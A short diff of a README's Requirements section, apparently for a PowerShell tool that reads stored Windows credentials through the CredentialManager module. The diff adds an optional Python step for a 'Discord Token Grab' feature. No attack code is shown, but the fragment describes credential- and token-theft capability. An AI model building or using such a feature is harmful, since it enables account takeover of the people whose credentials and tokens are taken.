@@ -12,7 +12,7 @@
 
 ### Requirements
 - PowerShell [CredentialManager](https://www.powershellgallery.com/packages/CredentialManager/2.0) Module : ``Install-Module -Name CredentialManager``
-- (Optionnal) Python 3
+> (Optionnal) Python 3, if you want Discord Token Grab
 
 
 ### Before Usage
